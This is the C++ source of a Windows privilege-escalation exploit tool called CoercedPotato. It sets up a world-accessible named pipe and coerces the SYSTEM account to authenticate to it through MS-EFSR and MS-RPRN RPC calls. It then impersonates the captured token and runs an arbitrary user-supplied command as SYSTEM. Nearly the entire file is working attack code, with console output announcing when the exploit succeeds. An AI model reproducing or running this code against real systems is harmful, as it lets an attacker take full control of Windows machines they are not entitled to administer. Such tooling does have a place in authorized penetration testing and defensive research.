#pragma once

#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>
#include <thread>
#include <tchar.h>
#include <string>
#include <locale>
#include <functional>
#include <rpc.h> 


#include "MS-EFSR_df1941c5-fe89-4e79-bf10-463657acf44d_h.h"
#include "ms-rprn_h.h"
#include "CLI11.hpp"

#pragma comment(lib, "RpcRT4.lib")
#pragma comment(lib, "userenv.lib")

const RPC_WSTR MS_RPRN_UUID = (RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB";
const RPC_WSTR InterfaceAddress = (RPC_WSTR)L"\\pipe\\spoolss";
BOOL g_bInteractWithConsole = FALSE;

struct NamedPipeThreadArgs {
    LPWSTR commandLine;
    const wchar_t* pipePath;
};

long callEfsRpcOpenFileRaw(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", targetedPipeName);
    long result;
    long flag = 0;
    PVOID pContext;

    result = EfsRpcOpenFileRaw(Binding, &pContext, targetedPipeName, flag);
    return result;
}

long callEfsRpcEncryptFileSrv(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcEncryptFileSrv with target path: %ws\r\n", targetedPipeName);
    long result;

    result = EfsRpcEncryptFileSrv(Binding, targetedPipeName);
    return result;
}

long callEfsRpcDecryptFileSrv(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcDecryptFileSrv with target path: %ws\r\n", targetedPipeName);
    long result;
    long OpenFlag = 0;

    result = EfsRpcDecryptFileSrv(Binding, targetedPipeName, OpenFlag);
    return result;
}

long callEfsRpcQueryUsersOnFile(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcQueryUsersOnFile with target path: %ws\r\n", targetedPipeName);
    long result;
    ENCRYPTION_CERTIFICATE_HASH_LIST* Users = nullptr;

    result = EfsRpcQueryUsersOnFile(Binding, targetedPipeName, &Users);
    return result;
}

long callEfsRpcQueryRecoveryAgents(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcQueryRecoveryAgents with target path: %ws\r\n", targetedPipeName);
    long result;
    ENCRYPTION_CERTIFICATE_HASH_LIST* Users = nullptr;

    result = EfsRpcQueryRecoveryAgents(Binding, targetedPipeName, &Users);
    return result;
}

long callEfsRpcRemoveUsersFromFile(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcRemoveUsersFromFile with target path: %ws\r\n", targetedPipeName);
    long result;
    ENCRYPTION_CERTIFICATE_HASH_LIST users;
    users.nCert_Hash = 1;
    ENCRYPTION_CERTIFICATE_HASH user;
    user.cbTotalLength = sizeof(ENCRYPTION_CERTIFICATE_HASH);
    user.pUserSid = nullptr;
    user.pHash = nullptr;
    user.lpDisplayInformation = nullptr;
    users.pUsers = new PENCRYPTION_CERTIFICATE_HASH[users.nCert_Hash];
    users.pUsers[0] = &user;

    result = EfsRpcRemoveUsersFromFile(Binding, targetedPipeName, &users);
    return result;
}

long callEfsRpcAddUsersToFile(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcAddUsersToFile with target path: %ws\r\n", targetedPipeName);
    long result;
    ENCRYPTION_CERTIFICATE_LIST certificates;
    certificates.nUsers = 1;
    ENCRYPTION_CERTIFICATE user;
    user.cbTotalLength = sizeof(ENCRYPTION_CERTIFICATE);
    user.pUserSid = nullptr;
    user.pCertBlob = nullptr;
    certificates.pUsers = new PENCRYPTION_CERTIFICATE[certificates.nUsers];
    certificates.pUsers[0] = &user;

    result = EfsRpcAddUsersToFile(Binding, targetedPipeName, &certificates);
    return result;
}

// NOT EXPLOITABLE YET
long callEfsRpcFileKeyInfo(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcFileKeyInfo with target path: %ws\r\n", targetedPipeName);
    long result;
    DWORD infoClass = 1;
    EFS_RPC_BLOB* keyInfo = nullptr;

    result = EfsRpcFileKeyInfo(Binding, targetedPipeName, infoClass, &keyInfo);
    return result;
}

long callEfsRpcDuplicateEncryptionInfoFile(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcDuplicateEncryptionInfoFile with target path: %ws\r\n", targetedPipeName);
    long result;
    DWORD dwCreationDisposition = 1;
    DWORD dwAttributes = 2;

    result = EfsRpcDuplicateEncryptionInfoFile(Binding, targetedPipeName, targetedPipeName, dwCreationDisposition, dwAttributes, nullptr, FALSE);
    return result;
}

long callEfsRpcAddUsersToFileEx(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcAddUsersToFileEx with target path: %ws\r\n", targetedPipeName);
    long result;
    DWORD dwFileKeyInfoFlags = 0;
    ENCRYPTION_CERTIFICATE_LIST certificates;
    certificates.nUsers = 1;
    ENCRYPTION_CERTIFICATE user;
    user.cbTotalLength = sizeof(ENCRYPTION_CERTIFICATE);
    user.pUserSid = nullptr;
    user.pCertBlob = nullptr;
    certificates.pUsers = new PENCRYPTION_CERTIFICATE[certificates.nUsers];
    certificates.pUsers[0] = &user;

    result = EfsRpcAddUsersToFileEx(Binding, dwFileKeyInfoFlags, nullptr, targetedPipeName, &certificates);
    return result;
}

// NOT EXPLOITABLE YET
long callEfsRpcFileKeyInfoEx(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcFileKeyInfoEx with target path: %ws\r\n", targetedPipeName);
    long result;
    DWORD dwFileKeyInfoFlags = 0;
    DWORD InfoClass = 1;
    EFS_RPC_BLOB* KeyInfo = nullptr;

    result = EfsRpcFileKeyInfoEx(Binding, dwFileKeyInfoFlags, nullptr, targetedPipeName, InfoClass, &KeyInfo);
    return result;
}

long callEfsRpcGetEncryptedFileMetadata(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcGetEncryptedFileMetadata with target path: %ws\r\n", targetedPipeName);
    long result;
    EFS_RPC_BLOB* EfsStreamBlob = nullptr;

    result = EfsRpcGetEncryptedFileMetadata(Binding, targetedPipeName, &EfsStreamBlob);
    return result;
}

long callEfsRpcEncryptFileExSrv(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcEncryptFileExSrv with target path: %ws\r\n", targetedPipeName);
    long result;
    wchar_t* ProtectorDescriptor = nullptr;
    unsigned long Flags = 0;

    result = EfsRpcEncryptFileExSrv(Binding, targetedPipeName, ProtectorDescriptor, Flags);
    return result;
}

long callEfsRpcQueryProtectors(RPC_BINDING_HANDLE Binding, LPWSTR targetedPipeName) {
    wprintf(L"[*] Invoking EfsRpcQueryProtectors with target path: %ws\r\n", targetedPipeName);
    long result;
    PENCRYPTION_PROTECTOR_LIST* ppProtectorList = new PENCRYPTION_PROTECTOR_LIST;
    ppProtectorList[0] = new ENCRYPTION_PROTECTOR_LIST;
    ppProtectorList[0]->nProtectors = 1;
    PENCRYPTION_PROTECTOR protector = new ENCRYPTION_PROTECTOR;
    protector->cbTotalLength = sizeof(ENCRYPTION_PROTECTOR);
    protector->pUserSid = nullptr;
    protector->lpProtectorDescriptor = nullptr;
    ppProtectorList[0]->pProtectors = new PENCRYPTION_PROTECTOR[1];
    ppProtectorList[0]->pProtectors[0] = protector;

    result = EfsRpcQueryProtectors(Binding, targetedPipeName, &ppProtectorList);
    return result;
}



void handleError(long result) {
    wprintf(L"[*] Error code returned : %ld\r\n", result);
    if (result == 53) {
        wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
    }
    else if (result == 5) {
        wprintf(L" -> [-] Access Denied requiring more privileges, trying another one...\r\n");
    }
    else if (result == 50) {
        wprintf(L" -> [-] RPC function probably not implemented on this system, trying another one...\r\n");
    }
    else if (result == 0) {
        wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
    }
    else {
        wprintf(L" -> [-] Exploit failed, unknown error, trying another function...\r\n");
    }
}

long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force)
{
    wprintf(L"[MS-EFSR] [*] Attempting MS-EFSR functions...\r\n\n");
    long result;

    LPWSTR targetedPipeName;
    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(targetedPipeName, MAX_PATH, L"\\\\127.0.0.1/pipe/coerced\\C$\\\x00");


    std::function<int()> functions[] = {
        [&]() { return callEfsRpcOpenFileRaw(Binding, targetedPipeName); },
        [&]() { return callEfsRpcEncryptFileSrv(Binding, targetedPipeName); },
        [&]() { return callEfsRpcDecryptFileSrv(Binding, targetedPipeName); },
        [&]() { return callEfsRpcQueryUsersOnFile(Binding, targetedPipeName); },
        [&]() { return callEfsRpcQueryRecoveryAgents(Binding, targetedPipeName); },
        [&]() { return callEfsRpcRemoveUsersFromFile(Binding, targetedPipeName); },
        [&]() { return callEfsRpcAddUsersToFile(Binding, targetedPipeName); },
        [&]() { return callEfsRpcFileKeyInfo(Binding, targetedPipeName); },
        [&]() { return callEfsRpcDuplicateEncryptionInfoFile(Binding, targetedPipeName); },
        [&]() { return callEfsRpcAddUsersToFileEx(Binding, targetedPipeName); },
        [&]() { return callEfsRpcFileKeyInfoEx(Binding, targetedPipeName); },
        [&]() { return callEfsRpcGetEncryptedFileMetadata(Binding, targetedPipeName); },
        [&]() { return callEfsRpcEncryptFileExSrv(Binding, targetedPipeName); },
        [&]() { return callEfsRpcQueryProtectors(Binding, targetedPipeName); }
    };
    int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
    if (exploitID == -1) {
        wprintf(L"[*] Starting RPC functions fuzzing...\r\n");
        for (int i = 0; i < sizeOfFunctions; i++) {
            wprintf(L"[MS-EFSR] ");
            result = functions[i]();
            wprintf(L"[MS-EFSR] ");
            handleError(result);
            if (result == 53 and !force) {
                LocalFree(targetedPipeName);
                return 0;
            }
        }
    }
    else {
        wprintf(L"[MS-EFSR] ");
        result = functions[exploitID]();
        wprintf(L"[MS-EFSR] ");
        handleError(result);
    }

    LocalFree(targetedPipeName);
    return -1;
}

long callRpcRemoteFindFirstPrinterChangeNotification(wchar_t* targetedPipeName) {
    wprintf(L"[*] Invoking RpcRemoteFindFirstPrinterChangeNotification with target path: %ws\r\n", targetedPipeName);
    // RETRIEVING HOSTNAME. NECESSARY FOR PRINTSPOOLER EXPLOIT
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    wchar_t* localhostComputerName;
    localhostComputerName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(localhostComputerName, MAX_PATH, L"\\\\%hs", computerName);

    // INITIALIZING ALL PARAMETERS
    PRINTER_HANDLE hPrinter = NULL;
    HRESULT hr = NULL;
    DEVMODE_CONTAINER devmodeContainer;
    SecureZeroMemory((char*)&(devmodeContainer), sizeof(DEVMODE_CONTAINER));

    RpcTryExcept
    {
        hr = RpcOpenPrinter(localhostComputerName, &hPrinter, NULL, &devmodeContainer, 0);

        if (hr == ERROR_SUCCESS) {
            hr = RpcRemoteFindFirstPrinterChangeNotification(hPrinter, 0x00000100 /* PRINTER_CHANGE_ADD_JOB */,0, targetedPipeName, 0, NULL,NULL);
            RpcClosePrinter(&hPrinter);
        }
        else
        {
            wprintf(L"RpcOpenPrinter failed %d\n", hr);
        }
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        hr = RpcExceptionCode();
        wprintf(L"RPC Exception %d. ", hr);
    }
    RpcEndExcept;
    return 0;
}

long callRpcRemoteFindFirstPrinterChangeNotificationEx(wchar_t* targetedPipeName) {
    wprintf(L"[MS-RPRN] [*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: %ws\r\n", targetedPipeName);
    // RETRIEVING HOSTNAME. NECESSARY FOR PRINTSPOOLER EXPLOIT
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    wchar_t* localhostComputerName;
    localhostComputerName = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(localhostComputerName, MAX_PATH, L"\\\\%hs", computerName);

    // INITIALIZING ALL PARAMETERS
    PRINTER_HANDLE hPrinter = NULL;
    HRESULT hr = NULL;
    DEVMODE_CONTAINER devmodeContainer;
    SecureZeroMemory((char*)&(devmodeContainer), sizeof(DEVMODE_CONTAINER));

    RpcTryExcept
    {
        hr = RpcOpenPrinter(localhostComputerName, &hPrinter, NULL, &devmodeContainer, 0);

        if (hr == ERROR_SUCCESS) {
            hr = RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, 0x00000100 /* PRINTER_CHANGE_ADD_JOB */,0, targetedPipeName, 0, NULL);
            RpcClosePrinter(&hPrinter);
        }
        else
        {
            wprintf(L"[MS-RPRN] [-] RpcOpenPrinter failed %d\n", hr);
        }
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        hr = RpcExceptionCode();
        wprintf(L"[MS-RPRN] [-] RPC Exception %d. ", hr);
    }
    RpcEndExcept;
    return 0;
}

long callRprnFunctions(int exploitID, bool force) {
    wprintf(L"[MS-RPRN] [*] Attempting MS-RPRN functions...\r\n\n");
    long result;

    LPWSTR targetedPipeName;
    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(targetedPipeName, MAX_PATH, L"\\\\127.0.0.1/pipe/coerced");


    std::function<int()> functions[] = {
        [&]() { return callRpcRemoteFindFirstPrinterChangeNotificationEx(targetedPipeName); },
        [&]() { return callRpcRemoteFindFirstPrinterChangeNotification(targetedPipeName);
    } };
    int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
    if (exploitID == -1) {
        wprintf(L"[MS-RPRN] Starting RPC functions fuzzing...\r\n");
        for (int i = 0; i < sizeOfFunctions; i++) {
            wprintf(L"[MS-RPRN] ");
            result = functions[i]();
            wprintf(L"[MS-RPRN] ");
            handleError(result);
            if (result == 0 and !force) {
                LocalFree(targetedPipeName);
                return 0;
            }
        }
    }
    else {
        wprintf(L"[MS-RPRN] ");
        result = functions[exploitID]();
        wprintf(L"[MS-RPRN] ");
        handleError(result);
    }

    LocalFree(targetedPipeName);
    return -1;
}

BOOL createRPCbind(RPC_BINDING_HANDLE& binding_h)
{

    RPC_STATUS status;
    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\localhost";

    RPC_WSTR bindingString = nullptr;
    status = RpcStringBindingCompose(
        nullptr,              // Address targeted (NULL for local binding)
        (RPC_WSTR)L"ncalrpc", // Protocol used 
        nullptr,              // Endpoint (NULL for dynamic binding)
        nullptr,              // UUID (NULL for dynamic binding)
        nullptr,              // Options (utilisez nullptr pour les options par défaut)
        &bindingString
    );

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
        return FALSE;
    }

    status = RpcBindingFromStringBinding(bindingString, &binding_h);

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
        RpcStringFree(&bindingString);
        return FALSE;
    }
    status = RpcStringFree(&bindingString);

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
    }
    wprintf(L"[+] RPC binding with localhost done \r\n");
    return TRUE;  // Success
}

void ExecuteCode(HANDLE hToken, LPWSTR commandLine) {
    DWORD dwCreationFlags = 0;
    LPWSTR lpCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };


    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

    if (!(lpCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
    {
        wprintf(L"[-] An error has occurred during the code execution...");
        return;
    }

    if (!GetSystemDirectory(lpCurrentDirectory, MAX_PATH))
    {
        printf("[-] GetSystemDirectory() Error: %i.\n", GetLastError());
        return;
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, hToken, FALSE))
    {
        printf("[-] CreateEnvironmentBlock() Error: %i.\n", GetLastError());
        return;
    }

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
    std::wstring commandLineStr(commandLine);
    // Concaténer "cmd.exe /c " à la chaîne
    commandLineStr = L"cmd.exe /c " + commandLineStr;
    // Reconvertir en LPWSTR si nécessaire
    LPWSTR newCommandLine = const_cast<LPWSTR>(commandLineStr.c_str());

    BOOL bSuccess = CreateProcessWithTokenW(hToken, LOGON_NETCREDENTIALS_ONLY, NULL, newCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si, &pi);

    if (g_bInteractWithConsole)
    {
        fflush(stdout);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }
    CloseHandle(hToken);
    free(lpCurrentDirectory);
    DestroyEnvironmentBlock(lpEnvironment);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}

DWORD WINAPI launchNamedPipeServer(LPVOID lpParam) {
    NamedPipeThreadArgs* args = static_cast<NamedPipeThreadArgs*>(lpParam);
    LPWSTR commandLine = args->commandLine;
    const wchar_t* pipePath = args->pipePath;

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };
    HANDLE hToken = ((HANDLE)(LONG_PTR)-1);
    LPWSTR lpName;

    lpName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintfW(lpName, MAX_PATH, pipePath);


    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
    {
        wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
        return -1;
    }

    if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
    {
        wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d - ", GetLastError());
        return -1;
    }

    if ((hPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
    {
        wprintf(L"[PIPESERVER] Named pipe '%ls' listening...\n\n", lpName);
        ConnectNamedPipe(hPipe, NULL);
        wprintf(L"\n[PIPESERVER] A client connected!\n\n");

        if (ImpersonateNamedPipeClient(hPipe)) {

            if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {

                ExecuteCode(hToken, commandLine);
                CloseHandle(hToken);
            }
            else
            {
                wprintf(L"OpenThreadToken() failed. Error = %d - ", GetLastError());
            }
        }
        else
        {
            wprintf(L"ImpersonateNamedPipeClient() failed. Error = %d - ", GetLastError());
        }
        CloseHandle(hPipe);
    }
    else
    {
        wprintf(L"CreateNamedPipe() failed. Error: %d - ", GetLastError());
    }
    return 0;
}

BOOL createNamedPipe(wchar_t* namedpipe, wchar_t* commandExecuted) {
    HANDLE hThread = NULL;
    NamedPipeThreadArgs poisonedNamedPipe;
    poisonedNamedPipe.pipePath = namedpipe;
    poisonedNamedPipe.commandLine = commandExecuted;
    hThread = CreateThread(NULL, 0, launchNamedPipeServer, &poisonedNamedPipe, 0, NULL);
    wprintf(L"[PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe %s.\r\n", poisonedNamedPipe.pipePath);
    return TRUE;
}

BOOL exploitMsEfsr(wchar_t* command, int exploitId, bool force) {
    wchar_t* namedpipe;
    namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\coerced\\pipe\\srvsvc");

    if (!createNamedPipe(namedpipe, command)) {
        wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
        return FALSE;
    }

    Sleep(500);

    handle_t RPCBind;
    if (!createRPCbind(RPCBind)) {
        wprintf(L"[RPCBIND] An error has occurred during the RPC binding \r\n");
        return FALSE;
    }
    Sleep(500);
    long result;
    result = CallEfsrFunctions(RPCBind, exploitId, force) == 0;
    return result;
}

BOOL exploitMsRprn(wchar_t* command, int exploitId, bool force) {
    long result;
    wchar_t* namedpipe;
    namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\coerced\\pipe\\spoolss");
    if (!createNamedPipe(namedpipe, command)) {
        wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
        return FALSE;
    }
    Sleep(500);
    return callRprnFunctions(exploitId, force) == 0;
}


void exploitAll(wchar_t* command, int exploitId, bool force) {
    wprintf(L"[+] RUNNING ALL KNOWN EXPLOITS.\r\n\n");
    BOOL stopFuzzing = FALSE;
    if (!stopFuzzing)
    {
        stopFuzzing=exploitMsRprn(command, exploitId, force);
    }
    if (!stopFuzzing)
    {
        stopFuzzing=exploitMsEfsr(command, exploitId, force);
    }

}

int main(int argc, char** argv)
{
    CLI::App app{ "CoercedPotato is an automated tool for privilege escalation exploit using SeImpersonatePrivilege or SeImpersonatePrimaryToken." };

    if (argc == 1) {
        wprintf(L"Use --help to show all usefull information.\r\n");
        wprintf(L"[-] Exiting...\r\n");
        exit(0);
    }

    std::string stringCommand;
    app.add_option("-c,--command", stringCommand, "Program to execute as SYSTEM (i.e. cmd.exe)")->required();

    std::string rpcInterface;
    app.add_option("-i,--interface", rpcInterface, "Optionnal interface to use (default : ALL) (Possible values : ms-rprn, ms-par, ms-efsr");

    int exploitId = -1;
    app.add_option("-n,--exploitId", exploitId, "Optionnal exploit ID (Only usuable if interface is defined) (ms-rprn : 0->1 | ms-par : 0->1 | ms-efsr : 0->13");

    bool force = false;
    app.add_option("-f,--force", force, "Force all RPC functions even if it says 'Exploit worked!' (Default value : false)");

    CLI11_PARSE(app, argc, argv);

    const char* charPointer = stringCommand.c_str();
    size_t maxBufferSize = stringCommand.size() + 1;
    wchar_t* command = new wchar_t[maxBufferSize];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, command, maxBufferSize, charPointer, maxBufferSize - 1);

    if (rpcInterface.empty() and exploitId != -1) {
        wprintf(L"%d\n", exploitId);
        wprintf(L"Please use rpcInterface parameter before defining exploitId. \r\n");
        wprintf(L"[-] Exiting...\r\n");
        exit(0);
    }

    if (rpcInterface.empty() and exploitId == -1) {
        exploitAll(command, exploitId, force);
        return 0;
    }
    else {
        if (rpcInterface == "ms-rprn") {
            exploitMsRprn(command, exploitId, force);
        }
        else if (rpcInterface == "ms-efsr") {
            exploitMsEfsr(command, exploitId, force);
        }
    }

    return 0;
    /*
    try {
        app.parse(argc, argv);

        if (help) {
            std::cout << app.help() << std::endl;
            return 0;
        }
    }
    catch (const CLI::ParseError& e) {
        std::cerr << "Erreur : " << e.what() << std::endl;
        return 1;
    }

    return 0;

    */
    /*
    *
        ("c,command", "Commande obligatoire", cxxopts::value<std::string>())
        ("i,rpcInterface", "Optionnal interface to use (default : ALL) (Possible values : ms-rprn, ms-par, ms-efsr", cxxopts::value<std::string>())
        ("n,exploitId", "Optionnal exploit ID (Only usuable if interface is defined) (ms-rprn : 0->1 | ms-par : 0->1 | ms-efsr : 0->14", cxxopts::value<int>())
        ("f,force", "Force all functions even if it says 'expl", cxxopts::value<bool>()->default_value("false"))
    try {
        auto result = options.parse(argc, argv);

        if (result.count("help")) {
            std::cout << options.help() << std::endl;
            return 0;
        }

        // Récupération des valeurs des arguments
        wchar_t* command = result["command"].as<wchar_t*>();
        wchar_t* rpcInterface = result["rpcInterface"].as<wchar_t*>(); // Valeur par défaut vide
        long exploitId = result["exploitId"].as<long>(); // Valeur par défaut -1

        if (command==L"") {
            wprintf(L"Argument 'command' is needed.");
            return -1;
        }



        // Affichage des arguments
        std::wcout << L"Commande : " << command << std::endl;
        if (rpcInterface == L"") {
            std::wcout << L"Interface : " << rpcInterface << std::endl;
        }
        if (exploitId != -1) {
            std::cout << "Exploit ID : " << exploitId << std::endl;
        }
    }
    catch (const cxxopts::exceptions::exception& e) {
        std::cerr << "Erreur : " << e.what() << std::endl;
        return 1;
    }

    /*
    if (argc == 1)
    {
        printf("\nUsage: %S <command> {Optional : ExploitID}\n\n", argv[0]);
        printf("\nExploitID available:");
        printf("ExploitID 0 => Auto - Default");
    }
    else
    {
        int exploitID = -1;
        if (argc == 3) {
            exploitID = std::stoi(argv[2]);
        }

        wchar_t* command = argv[1];
        wchar_t* namedpipe;
        namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
        StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\coerced\\pipe\\spoolss");



        if (!createNamedPipe(namedpipe,command)) {
            wprintf(L"[-] An error has occurred while creating the pipe server\r\n");
            return 1;
        }

        Sleep(500);

        handle_t RPCBind;
        if (!createRPCbind(RPCBind)) {
            wprintf(L"An error has occurred during the RPC binding \r\n");
            return 1;
        }
        Sleep(500);

        //CallEfsrFunctions(RPCBind,exploitID);
        callRprnFunctions(exploitID);
    }
    */
}



void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}

// Taken from https://github.com/leechristensen/SpoolSample/blob/master/MS-RPRN/main.cpp 
handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
    RPC_STATUS RpcStatus;
    RPC_WSTR StringBinding;
    handle_t BindingHandle;
    WCHAR   ServerName[MAX_PATH + 1];
    DWORD   i;

    if (lpStr && lpStr[0] == L'\\' && lpStr[1] == L'\\') {
        // We have a servername
        ServerName[0] = ServerName[1] = '\\';

        i = 2;
        while (lpStr[i] && lpStr[i] != L'\\' && i < sizeof(ServerName)) {
            ServerName[i] = lpStr[i];
            i++;
        }

        ServerName[i] = 0;
    }
    else {
        return FALSE;
    }

    RpcStatus = RpcStringBindingComposeW(
        MS_RPRN_UUID,
        (RPC_WSTR)L"ncacn_np",
        (RPC_WSTR)ServerName,
        InterfaceAddress,
        NULL,
        &StringBinding);

    if (RpcStatus != RPC_S_OK) {
        return(0);
    }

    RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

    RpcStringFreeW(&StringBinding);

    if (RpcStatus != RPC_S_OK) {
        wprintf(L"[-] An error has occurred during STRING_HANDLE_bind()...\r\n");
        return(0);
    }

    return(BindingHandle);
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
    RPC_STATUS       RpcStatus;

    RpcStatus = RpcBindingFree(&BindingHandle);
    if (RpcStatus == RPC_S_INVALID_BINDING) wprintf(L"[-] An error has occurred during STRING_HANDLE_unbind()...\r\n");

    return;
}